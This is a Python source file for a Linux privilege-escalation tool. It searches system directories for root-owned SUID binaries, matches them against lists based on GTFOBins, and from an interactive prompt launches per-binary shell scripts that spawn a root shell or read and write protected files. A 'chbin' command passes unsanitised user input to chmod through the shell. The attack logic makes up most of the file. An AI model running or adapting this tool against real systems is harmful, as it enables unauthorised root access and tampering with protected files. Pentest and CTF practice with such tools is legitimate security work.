#!/usr/bin/python3
import os
import subprocess
from termcolor import colored
import time

#####################################################################################################################
#                                                                                                                   #
# Author : Akash Pandey a.k.a L3V1ATH0N                                                                             #
# Date :   05/04/2021                                                                                               #
# Message to Script Kiddies : Remember Changing Author Name will never make you 1337. Appreciate someone's hardwork.#
# Tool For : Anyone who is interested in Security or wants to test their binaries.                                  #
# Benefits : Merged all legit abusing lines from gtfobins and automated them. Did hardwork for smart work.          #
# Helping Hands - GTFOBINS https://gtfobins.github.io/                                                              #
#                                                                                                                   #
#####################################################################################################################


###### Normal Binaries which are always running and not Mis-Configured to current version. You can add your system normal binaries here.
# Common Binaries included.

normal = ['exim4','mount.nfs','pppd','mount.cifs','pkexec',
        'bwrap','chsh','passwd','kismet_cap_linux_bluetooth',
        'kismet_cap_ti_cc_2540','kismet_cap_ti_cc_2531','kismet_cap_nrf_51822','kismet_cap_nxp_kw41z','fusermount3',
        'chfn','gpasswd','mount','newgrp','sudo','su','ntfs-3g',
        'kismet_cap_linux_wifi','kismet_cap_nrf_mousejack','umount','ssh-keysign','Xorg.wrap']

###### Vulnerable Binaries which are Vulnerable and Suspicious. You can add new Vulnerable Binaries here.

ld_2 = '' # Searching for ld-2 binaries in lib folder the version may vary on different system. This logic works for every system ld-2 binary.
try:
    for ld in os.listdir('/lib/x86_64-linux-gnu/'):
        if 'ld-2.3' in ld:
            ld_2 = ld
except:
    ld_2 = None

# IF YOU HAVE LUA INSTALLED THEN REMOVE. 
'''#THIS

lua_ver = '' #Searching for lua versions in bin folder.
try:
    for lua in os.listdir('/usr/bin/'):
        if 'lua5.' in lua:
            lua_ver = lua
except:
    lua_ver = None

'''#AND THIS FOR UNCOMMENT.

vuln = ['ash','bash','capsh','chmod','chroot',
        'chown','cpulimit','bsd-csh','dash','dmsetup',
        'docker','emacs-gtk','env','expect','find',
        'flock','gdb','gimp-2.10','gtester','hping3',
        'ionice','ip','jjs','jrunscript','ksh93',
        ld_2,'logsave','make','nice','node',
        'nohup','openvpn','perl','php7.4','python',
        'rlwrap','rsync','run-parts','rview','vim.gtk3','setarch','start-stop-daemon',
        'stdbuf','strace','systemctl','taskset','tclsh8.6','time',
        'timeout','unshare','view','xargs','zsh','python2.7','python3.7','python3.8','python3.9']

###### Locations for searching Mis-Configured Binaries. If You are 'root' and want to search SUID binaries in system then you can add more / folders here. 

locations = ['/bin','/dev','/lib/x86_64-linux-gnu/','/lib64',
        '/libx32','/mnt','/opt','/sbin','/usr/bin','/usr/sbin']

###### This Binaries are set to be SUID BIT and Mis-Configured to 'read/write/download/upload' .

rwud_vuln = ['x86_64-linux-gnu-ar','arp','atobm','awk','gawk','base32','base64','basenc','busybox','bridge','cat',
        'column','comm','cp','cpio','ksshell','less','look','lua5.','lua50','lwp-download','csplit',
        'cupsfilter','curl','cut','date','dd','dialog','diff','dig','ed',
        'eqn','expand','file','fmt','fold','grep','gzip','hd','head','hexdump','highlight','iconv',
        'ip','join','jq','mawk','more','msgcat','msgattrib','msgmerge','msgfilter','msguniq','msgconv',
        'nawk','nl','nmap','nano','od','openssl','paste','pic','pico','pg','pr','puppet','readelf',
        'red','restic','rev','run-mailcap','sed','shuf','soelim','sort','sqlite3','ss','ssh-keyscan','ssh-keygen',
        'strings','sysctl','tac','tail','tbl','tee','tftp','troff','ul','unexpand','uniq',
        'update-alternatives','uudecode','uuencode','vim','vimdiff','rvim','rview','vpiw','vigr','wget','xmodmap','xxd','xz','zsoelim']

def help():

    print(colored('\nrootex\t - -4buzes the SUID binary which provides R00T Shell .','red',attrs=['reverse']))
    print(colored('rwexp\t - -4buZes the SUID binary which provides to read/write files.','magenta'))
    print('help\t - Prints this message.')
    print(colored('exit\t - Exits the program after scanning.','cyan'))
    print(colored('save\t - Saves the output in current directory.','green'))
    print(colored('list\t - Lists all the mis-configured binaries.','white'))
    print(colored('scan\t - Scans again all the binaries.'))
    print(colored('clear\t - Clears the screen softly. You can scroll up to see cleared output.','blue'))
    print(colored('author   - Prints the name of a site which helped me save my time :)','red'))
    print(colored('chbin\t - Changes the file permission (Only if you have permission or escalated to r00t ;)','yellow'))
    
def banner():
	try:
            subprocess.check_call('python3 banner.py',shell=True)
            print(colored('\n\t\t\t\t[R00T]    = -4buZer will provide root shell.','red'))
            print(colored('\t\t\t\t[R-W-U-D] = -4buZer will give privileges to Read, Write, Upload, Download.','magenta'))
            print(colored('\t\t\t\t[ HACK ]  = -4buZer is available for binary.','yellow'))
            print(colored('\t\t\t\t[Normal]  = Binaries are normal not 4buZing.','green'))
            time.sleep(2)
            print()
	except subprocess.CalledProcessError:
		print(colored("\n[ERROR] The Banner for -4buzer can't be found ! :( . Please change directory to 4BUZER/ folder.\n",'red'))
		exit(1)

def perm_checker():
    date = time.ctime(time.time())
    host = os.uname()[1]
    vulnerable = 0
    suspicious = 0
    exploitroot = []    # Appending the binary name for root shell 
    exploitrw = []      # Appending the binary name for rwud privileges.
    root_save = []      # Root Shell binary saving 
    rwud_save = []      # rwud binary saving

    for locate in locations:
        try:            
            # Searching for SUID BITS inside all files and  folders.
            find_bin = "find "+locate+" -user root -perm -4000 2>/dev/null"

            print(colored('[+] Searching in {}'.format(locate),'white'))
            permis = subprocess.check_output(find_bin,shell=True,text=True).split('\n')
            print('[+] Searched {}'.format(locate))
        except subprocess.CalledProcessError:
            print(colored('[ERROR] No Folder Existence!','yellow'))
            pass
         # For bin_name data to pass to function exploit.
        for perm in permis:

            bin_name = perm.split('/')

                # Taking the binary name and matching it with 'vuln' list. for eg:- /usr/bin/nice in bin_name[-1] is nice.

            if bin_name[-1] in vuln:
                root_save.append(perm)
                print(colored('\n[R00T] Found {} .'.format(perm),'red'))
                vulnerable += 1
                exploitroot.append(bin_name[-1])
                print(colored('[ Hack ] is available for {} .\n'.format(perm),'yellow',attrs=['reverse']))
                                
                # Taking the binary name and matching it with 'normal' list. for eg:- /usr/bin/exim4 in bin_name[-1] is exim4.
                
            if bin_name[-1] in normal:
                print(colored('[Normal] binary {}'.format(perm),'green'))
                
                # Taking the binary name and matching it with 'rwud_vuln' list. rwud is read/write/upload/download. Some SUID don't spawn root shell but are -4buzing to Read, Write, Upload, and Download.

            if bin_name[-1] in rwud_vuln:
                rwud_save.append(perm)
                print(colored('\n[R-W-U-D] Found {}'.format(perm),'magenta'))
                suspicious += 1
                exploitrw.append(bin_name[-1])
                print(colored('[ Hack ] is available for {}\n'.format(perm),'yellow'))

    if vulnerable > 0 or suspicious > 0:
        print(colored('\n[FOUND-R00T] There is/are ( {} ) Mis-Configured Binary/ies.'.format(str(vulnerable)),'red'))
        print(colored('\n[FOUND-RWUD] There is/are ( {} ) Mis-Configured Binary/ies.'.format(str(suspicious)),'magenta'))

            # What to do with output.
        print('\n[TIP] Type "help" to check!')
        while True:
            print(colored('\n{}💀-4buZer > '.format(host),'red'),end='')
            response = input()
            strip = response.strip(' ')
            if strip == 'rootex':
                try:
                    print(colored('Executing...','red'))
                    time.sleep(1)
                    print(colored('Executed R00T Shell -4buZer script for {}'.format(exploitroot[0]),'red',attrs=['blink']))
                    print(colored('\n[TIP] In case no root shell then locate the binary exploit file in root-binaries folder and execute the command of that file manually on terminal.\n','white',attrs=['reverse']))
                    exploit(exploitroot[0])
                except IndexError:
                    print(colored('\n[ERROR] No Mis-Configurations were found for R00T Shell.','red'))
        
            elif strip == 'rwexp':
                try:
                    print(colored('Executing...','magenta'))
                    time.sleep(1)
                    print(colored('Executed R-W -4buZer script for {}'.format(exploitrw[0]),'magenta',attrs=['blink'])) ##### Add rwexp exploit below.
                    print(colored('\n[TIP] In case no file output was displayed then locate the binary exploit file in rw-binaries folder and execute the command of that file manually on terminal.\n','white',attrs=['reverse']))
                    rw_exploit(exploitrw[0])
                except IndexError:
                    print(colored('\n[ERROR] No Mis-Configurations were found for Reading & Writing.','magenta'))

            elif strip == 'help':
                help()
        
            elif strip == 'exit':
                print(colored('\nExited Successfully... !','red'))
                exit(0)
            elif strip == 'scan':
                perm_checker()
        
            elif strip == 'save':
                print(colored('\n[+] [FILE_NAME]@-4buZer > ','red'),end='')
                file_name = input()
                print(colored('Please Wait Saving',attrs=['blink']))
                time.sleep(2)
                for saved in root_save:     # Saving file path which is misconfigured to R00T shell in a file for later auditing.
                    with open(file_name,'a') as data:
                        data.write('\n\nScanned On: ')
                        data.write(str(date))
                        data.write('\n[R00T Shell] --> ')
                        data.write(saved)
                for ruwd in rwud_save:      # Saving file path which is misconfgured to Read-Write-Upload-Download in a file.
                    with open(file_name,'a') as data:
                        data.write('\n\nScanned On: ')
                        data.write(str(date))
                        data.write('\n[Read-Write-Upload-Download] --> ')
                        data.write(ruwd)
                print(colored('\nDone with Saving data.','yellow'))

            elif strip == 'author':
                print(colored('\nAuthor : Akash Pandey aka L3V1ATH0N','cyan'))
                print(colored('\nHelper : https://gtfobins.github.io/','cyan'))

            elif strip == 'clear':
                os.system('clear -x')
                #Incase if you don't want banner after clearing screen you can comment this below line.
                os.system('./banner.py')
            elif strip == 'chbin':
                try:
                    print('\n[TIP] This command will only change the permission for SUID BIT and only if you are Root User (Escalate to Root ;-] ).')
                    print(colored('\n[#] [File Perm]@-4buZer > ','yellow'),end=' ')
                    chbins = input('File Path for binary file(eg:/bin/bash):- ')
                    subprocess.call('chmod -s '+chbins,shell=True)                
                except:
                    print(colored('\n[ERROR]','red',attrs=['blink']))
                    #continue
            elif strip == 'list':
                print()
                for rootlist in root_save[:]:
                    print(colored('[R00T] --> {}'.format(rootlist),'white'))
                for rwlist in rwud_save[:]:
                    print(colored('[RWUD] --> {}'.format(rwlist),'white'))
            else:
                #os.system('clear -x')
                pass

    elif vulnerable == 0:
        print(colored('\n[+] Nothing Suspicious Found.','blue'))
        print(colored('[+] Searched All Accessible Files/Folders.\n','blue'))
        
    #except:
        #print(colored('[-] OOps something went wrong !','red'))


# This function is just for r00t sh3ll.

def exploit(binary):
    if 'dash' in binary:
        subprocess.call('bash root-binaries/suid_ash.sh',shell=True)
    elif 'python2' in binary:
        subprocess.call('bash root-binaries/suid_python.sh',shell=True)
    elif 'python3' in binary:
        subprocess.call('bash root-binaries/suid_python3.sh',shell=True)
    elif 'systemctl' in binary:
        subprocess.call('bash root-binaries/suid_systemctl.sh',shell=True)
    elif 'hping3' in binary:
        subprocess.call('bash root-binaries/suid_hping3.sh',shell=True)
    elif 'bash' in binary:
        subprocess.call('bash root-binaries/suid_bash.sh',shell=True)
    # Uncomment this line if busybox version is lower than current version & add name busybox in vuln list.
    #elif 'busybox' in binary:
    #    subprocess.call('bash root-binaries/suid_busybox.sh',shell=True)
    elif 'capsh' in binary:
        subprocess.call('bash root-binaries/suid_capsh.sh',shell=True)
    elif 'chmod' in binary:
        subprocess.call('bash root-binaries/suid_chmod.sh',shell=True)
    elif 'chroot' in binary:
        subprocess.call('bash root-binaries/suid_chroot.sh',shell=True)
    elif 'chown' in binary:
        subprocess.call('bash root-binaries/suid_chown.sh',shell=True)
    elif 'cpulimit' in binary:
        subprocess.call('bash root-binaries/suid_cpulimit.sh',shell=True)
    elif 'bsd-csh' in binary:
        subprocess.call('bash root-binaries/suid_csh.sh',shell=True)
    elif 'dmsetup' in binary:
        subprocess.call('bash root-binaries/suid_dmsetup.sh',shell=True)
    elif 'docker' in binary:
        subprocess.call('bash root-binaries/suid_docker.sh',shell=True)
    elif 'emacs' in binary:
        subprocess.call('bash root-binaries/suid_emacs.sh',shell=True)
    elif 'env' in binary:
        subprocess.call('bash root-binaries/suid_env.sh',shell=True)
    elif 'expect' in binary:
        subprocess.call('bash root-binaries/suid_expect.sh',shell=True)
    elif 'find' in binary:
        subprocess.call('bash root-binaries/suid_find.sh',shell=True)
    elif 'flock' in binary:
        subprocess.call('bash root-binaries/suid_flock.sh',shell=True)
    elif 'gdb' in binary:
        subprocess.call('bash root-binaries/suid_gdb.sh',shell=True)
    elif 'gimp-' in binary:
        subprocess.call('bash root-binaries/suid_gimp.sh',shell=True)
    elif 'gtester' in binary:
        subprocess.call('bash root-binaries/suid_gtester.sh',shell=True)
    elif 'ionice' in binary:
        subprocess.call('bash root-binaries/suid_ionice.sh',shell=True)
    elif 'ip' in binary:
        subprocess.call('bash root-binaries/suid_ip.sh',shell=True)
    elif 'jjs' in binary:
        subprocess.call('bash root-binaries/suid_jjs.sh',shell=True)
    elif 'jrunscript' in binary:
        subprocess.call('bash root-binaries/suid_jrunscript.sh',shell=True)
    elif 'ksh' in binary:
        subprocess.call('bash root-binaries/suid_ksh.sh',shell=True)
    elif 'ld-2.' in binary:     
        subprocess.call('bash root-binaries/suid_ld-2.30.so.sh',shell=True)
    elif 'logsave' in binary:
        subprocess.call('bash root-binaries/suid_logsave.sh',shell=True)
    elif 'make' in binary:
        subprocess.call('bash root-binaries/suid_make.sh',shell=True)
    elif 'nice' in binary:
        subprocess.call('bash root-binaries/suid_nice.sh',shell=True)
    elif 'node' in binary:
        subprocess.call('bash root-binaries/suid_node.sh',shell=True)
    elif 'nohup' in binary:
        subprocess.call('bash root-binaries/suid_nohup.sh',shell=True)
    elif 'openvpn' in binary:
        subprocess.call('bash root-binaries/suid_openvpn.sh',shell=True)
    elif 'perl' in binary:
        subprocess.call('bash root-binaries/suid_perl.sh',shell=True)
    elif 'php7' in binary:
        subprocess.call('bash root-binaries/suid_php.sh',shell=True)
    elif 'rlwrap' in binary:
        subprocess.call('bash root-binaries/suid_rlwrap.sh',shell=True)
    elif 'rsync' in binary:
        subprocess.call('bash root-binaries/suid_rsync.sh',shell=True)
    elif 'run-parts' in binary:
        subprocess.call('bash root-binaries/suid_run-parts.sh',shell=True)
    elif 'rview' in binary:
        subprocess.call('bash root-binaries/suid_rview.sh',shell=True)
    elif 'vim.' in binary:
        subprocess.call('bash root-binaries/suid_rvim.sh',shell=True)
    elif 'setarch' in binary:
        subprocess.call('bash root-binaries/suid_setarch.sh',shell=True)
    elif 'start-stop-daemon' in binary:
        subprocess.call('bash root-binaries/suid_setarch.sh',shell=True)
    elif 'stdbuf' in binary:
        subprocess.call('bash root-binaries/suid_stdbuf.sh',shell=True)
    elif 'strace' in binary:
        subprocess.call('bash root-binaries/suid_strace.sh',shell=True)
    elif 'taskset' in binary:
        subprocess.call('bash root-binaries/suid_taskset.sh',shell=True)
    elif 'tclsh8' in binary:
        subprocess.call('bash root-binaries/suid_tclsh.sh',shell=True)
    elif 'time' in binary:
        subprocess.call('bash root-binaries/suid_time.sh',shell=True)
    elif 'timeout' in binary:
        subprocess.call('bash root-binaries/suid_timeout.sh',shell=True)
    elif 'unshare' in binary:
        subprocess.call('bash root-binaries/suid_unshare.sh',shell=True)
    elif 'xargs' in binary:
        subprocess.call('bash root-binaries/suid_xargs.sh',shell=True)
    elif 'zsh' in binary:
        subprocess.call('bash root-binaries/suid_zsh.sh',shell=True)
    else:
        print(colored('[!] No Exploit file found for {}. Check root-binaries folder.'.format(binary),'red'))
        pass

def rw_exploit(binary):
    
    if 'x86_64-linux-gnu-ar' in binary:
        subprocess.call('bash rw-binaries/suid_ar.sh',shell=True)
    elif 'arp' in binary:
        subprocess.call('bash rw-binaries/suid_arp.sh',shell=True)
    elif 'atobm' in binary:
        subprocess.call('bash rw-binaries/suid_atobm.sh',shell=True)
    elif 'awk' in binary:
        subprocess.call('bash rw-binaries/suid_awk.sh',shell=True)
    elif 'gawk' in binary:
        subprocess.call('bash rw-binaries/suid_gawk.sh',shell=True)
    elif 'base32' in binary:
        subprocess.call('bash rw-binaries/suid_base32.sh',shell=True)
    elif 'base64' in binary:
        subprocess.call('bash rw-binaries/suid_base64.sh',shell=True)
    elif 'basenc' in binary:
        subprocess.call('bash rw-binaries/suid_basenc.sh',shell=True)
    elif 'busybox' in binary:
        subprocess.call('bash rw-binaries/suid_busybox.sh',shell=True)
    elif 'bridge' in binary:
        subprocess.call('bash rw-binaries/suid_bridge.sh',shell=True)
    elif 'cat' in binary:
        subprocess.call('bash rw-binaries/suid_cat.sh',shell=True)
    elif 'column' in binary:
        subprocess.call('bash rw-binaries/suid_column.sh',shell=True)
    elif 'comm' in binary:
        subprocess.call('bash rw-binaries/suid_comm.sh',shell=True)
    elif 'cp' in binary:
        subprocess.call('bash rw-binaries/suid_cp.sh',shell=True)
    elif 'cpio' in binary:
        subprocess.call('bash rw-binaries/suid_cpio.sh',shell=True)
    elif 'ksshell' in binary:
        subprocess.call('bash rw-binaries/suid_ksshell.sh',shell=True)
    elif 'less' in binary:
        subprocess.call('bash rw-binaries/suid_less.sh',shell=True)
    elif 'look' in binary:
        subprocess.call('bash rw-binaries/suid_look.sh',shell=True)
    elif 'lua50' in binary:
        subprocess.call('bash rw-binaries/suid_lua50.sh',shell=True)
    elif 'lua5.' in binary:
        subprocess.call('bash rw-binaries/suid_lua.sh',shell=True)
    elif 'lwp-download' in binary:
        subprocess.call('bash rw-binaries/suid_lwp-download.sh',shell=True)
    elif 'csplit' in binary:
        subprocess.call('bash rw-binaries/suid_csplit.sh',shell=True)
    elif 'cupsfilter' in binary:
        subprocess.call('bash rw-binaries/suid_cupsfilter.sh',shell=True)
    elif 'curl' in binary:
        subprocess.call('bash rw-binaries/suid_curl.sh',shell=True)
    elif 'cut' in binary:
        subprocess.call('bash rw-binaries/suid_cut.sh',shell=True)
    elif 'date' in binary:
        subprocess.call('bash rw-binaries/suid_date.sh',shell=True)
    elif 'dd' in binary:
        subprocess.call('bash rw-binaries/suid_dd.sh',shell=True)
    elif 'dialog' in binary:
        subprocess.call('bash rw-binaries/suid_dialog.sh',shell=True)
    elif 'diff' in binary:
        subprocess.call('bash rw-binaries/suid_diff.sh',shell=True)
    elif 'dig' in binary:
        subprocess.call('bash rw-binaries/suid_dig.sh',shell=True)
    #elif 'docker' in binary:
    #    subprocess.call('bash rw-binaries/suid_docker.sh',shell=True)
    elif 'ed' in binary:
        subprocess.call('bash rw-binaries/suid_ed.sh',shell=True)
    elif 'eqn' in binary:
        subprocess.call('bash rw-binaries/suid_eqn.sh',shell=True)
    elif 'expand' in binary:
        subprocess.call('bash rw-binaries/suid_expand.sh',shell=True)
    elif 'file' in binary:
        subprocess.call('bash rw-binaries/suid_file.sh',shell=True)
    elif 'fmt' in binary:
        subprocess.call('bash rw-binaries/suid_fmt.sh',shell=True)
    elif 'fold' in binary:
        subprocess.call('bash rw-binaries/suid_fold.sh',shell=True)
    elif 'grep' in binary:
        subprocess.call('bash rw-binaries/suid_grep.sh',shell=True)
    elif 'gzip' in binary:
        subprocess.call('bash rw-binaries/suid_gzip.sh',shell=True)
    elif 'hd' in binary:
        subprocess.call('bash rw-binaries/suid_hd.sh',shell=True)
    elif 'head' in binary:
        subprocess.call('bash rw-binaries/suid_head.sh',shell=True)
    elif 'hexdump' in binary:
        subprocess.call('bash rw-binaries/suid_hexdump.sh',shell=True)
    elif 'highlight' in binary:
        subprocess.call('bash rw-binaries/suid_highlight.sh',shell=True)
    elif 'iconv' in binary:
        subprocess.call('bash rw-binaries/suid_iconv.sh',shell=True)
    elif 'ip' in binary:
        subprocess.call('bash rw-binaries/suid_ip.sh',shell=True)
    elif 'join' in binary:
        subprocess.call('bash rw-binaries/suid_join.sh',shell=True)
    elif 'jq' in binary:
        subprocess.call('bash rw-binaries/suid_jq.sh',shell=True)
    elif 'mawk' in binary:
        subprocess.call('bash rw-binaries/suid_mawk.sh',shell=True)
    elif 'more' in binary:
        subprocess.call('bash rw-binaries/suid_more.sh',shell=True)
    elif 'msgcat' in binary:
        subprocess.call('bash rw-binaries/suid_msgcat.sh',shell=True)
    elif 'msgattrib' in binary:
        subprocess.call('bash rw-binaries/suid_msgattrib.sh',shell=True)
    elif 'msgconv' in binary:
        subprocess.call('bash rw-binaries/suid_msgconv.sh',shell=True)
    elif 'msgmerge' in binary:
        subprocess.call('bash rw-binaries/suid_msgmerge.sh',shell=True)
    elif 'msguniq' in binary:
        subprocess.call('bash rw-binaries/suid_msguniq.sh',shell=True)
    elif 'nawk' in binary:
        subprocess.call('bash rw-binaries/suid_nawk.sh',shell=True)
    elif 'nl' in binary:
        subprocess.call('bash rw-binaries/suid_nl.sh',shell=True)
    elif 'nmap' in binary:
        subprocess.call('bash rw-binaries/suid_nmap.sh',shell=True)
    elif 'od' in binary:
        subprocess.call('bash rw-binaries/suid_od.sh',shell=True)
    elif 'openssl' in binary:
        subprocess.call('bash rw-binaries/suid_openssl.sh',shell=True)
    elif 'paste' in binary:
        subprocess.call('bash rw-binaries/suid_paste.sh',shell=True)
    elif 'pic' in binary:
        subprocess.call('bash rw-binaries/suid_pic.sh',shell=True)
    elif 'nano' in binary or 'pico' in binary:
        subprocess.call('bash rw-binaries/suid_pico.sh',shell=True)
    elif 'pg' in binary:
        subprocess.call('bash rw-binaries/suid_pg.sh',shell=True)
    elif 'pr' in binary:
        subprocess.call('bash rw-binaries/suid_pr.sh',shell=True)
    elif 'puppet' in binary:
        subprocess.call('bash rw-binaries/suid_puppet.sh',shell=True)
    elif 'readelf' in binary:
        subprocess.call('bash rw-binaries/suid_readelf.sh',shell=True)
    elif 'red' in binary:
        subprocess.call('bash rw-binaries/suid_red.sh',shell=True)
    elif 'rev' in binary:
        subprocess.call('bash rw-binaries/suid_rev.sh',shell=True)
    elif 'ruby2.' in binary:
        subprocess.call('bash rw-binaries/suid_ruby.sh',shell=True)
    elif 'run-mailcap' in binary:
        subprocess.call('bash rw-binaries/suid_run-mailcap.sh',shell=True)
    elif 'sed' in binary:
        subprocess.call('bash rw-binaries/suid_sed.sh',shell=True)
    elif 'shuf' in binary:
        subprocess.call('bash rw-binaries/suid_shuf.sh',shell=True)
    elif 'soelim' in binary:
        subprocess.call('bash rw-binaries/suid_soelim.sh',shell=True)
    elif 'sort' in binary:
        subprocess.call('bash rw-binaries/suid_sort.sh',shell=True)
    elif 'sqlite3' in binary:
        subprocess.call('bash rw-binaries/suid_sqlite3.sh',shell=True)
    elif 'ss' in binary:
        subprocess.call('bash rw-binaries/suid_ss.sh',shell=True)
    elif 'ssh-keyscan' in binary:
        subprocess.call('bash rw-binaries/suid_ssh-keyscan.sh',shell=True)
    elif 'ssh-keygen' in binary:
        subprocess.call('bash rw-binaries/suid_ssh-keygen.sh',shell=True)
    elif 'strings' in binary:
        subprocess.call('bash rw-binaries/suid_strings.sh',shell=True)
    elif 'sysctl' in binary:
        subprocess.call('bash rw-binaries/suid_sysctl.sh',shell=True)
    elif 'tac' in binary:
        subprocess.call('bash rw-binaries/suid_tac.sh',shell=True)
    elif 'tail' in binary:
        subprocess.call('bash rw-binaries/suid_tail.sh',shell=True)
    elif 'tbl' in binary:
        subprocess.call('bash rw-binaries/suid_tbl.sh',shell=True)
    elif 'tee' in binary:
        subprocess.call('bash rw-binaries/suid_tee.sh',shell=True)
    elif 'tftp' in binary:
        subprocess.call('bash rw-binaries/suid_tftp.sh',shell=True)
    elif 'troff' in binary:
        subprocess.call('bash rw-binaries/suid_troff.sh',shell=True)
    elif 'ul' in binary:
        subprocess.call('bash rw-binaries/suid_ul.sh',shell=True)
    elif 'unexpand' in binary:
        subprocess.call('bash rw-binaries/suid_unexpand.sh',shell=True)
    elif 'uniq' in binary:
        subprocess.call('bash rw-binaries/suid_uniq.sh',shell=True)
    elif 'update-alternatives' in binary:
        subprocess.call('bash rw-binaries/suid_update-alternatives.sh',shell=True)
    elif 'uudecode' in binary:
        subprocess.call('bash rw-binaries/suid_uudecode.sh',shell=True)
    elif 'uuencode' in binary:
        subprocess.call('bash rw-binaries/suid_uuencode.sh',shell=True)
    elif 'vim' in binary:
        subprocess.call('bash rw-binaries/suid_vim.sh',shell=True)
    elif 'vimdiff' in binary:
        subprocess.call('bash rw-binaries/suid_vimdiff.sh',shell=True)
    elif 'rvim' in binary:
        subprocess.call('bash rw-binaries/suid_rvim.sh',shell=True)
    elif 'rview' in binary:
        subprocess.call('bash rw-binaries/suid_rview.sh',shell=True)
    elif 'vpiw' in binary:
        subprocess.call('bash rw-binaries/suid_vpiw.sh',shell=True)
    elif 'vigr' in binary:
        subprocess.call('bash rw-binaries/suid_vigr.sh',shell=True)
    elif 'wget' in binary:
        subprocess.call('bash rw-binaries/suid_wget.sh',shell=True)
    elif 'xmodmap' in binary:
        subprocess.call('bash rw-binaries/suid_xmodmap.sh',shell=True)
    elif 'xxd' in binary:
        subprocess.call('bash rw-binaries/suid_xxd.sh',shell=True)
    elif 'xz' in binary:
        subprocess.call('bash rw-binaries/suid_xz.sh',shell=True)
    elif 'zsoelim' in binary:
        subprocess.call('bash rw-binaries/suid_zsoelim.sh',shell=True)
    else:
        print(colored('[!] No Exploit file found for {}. Check rw-binaries folder.'.format(binary),'magenta'))
        pass

def main():
    
    # Calling All Functions
    
    ######
    '''
    
    If any binaries doesn\'t provide expected output then it is probably because of the updated version of binaries.
    For eg:- 1.30.* never provides expected output. But this script will work properly on lower version of busybox.

    '''
    #####

    banner()
    time.sleep(2)
    perm_checker()
    
main()
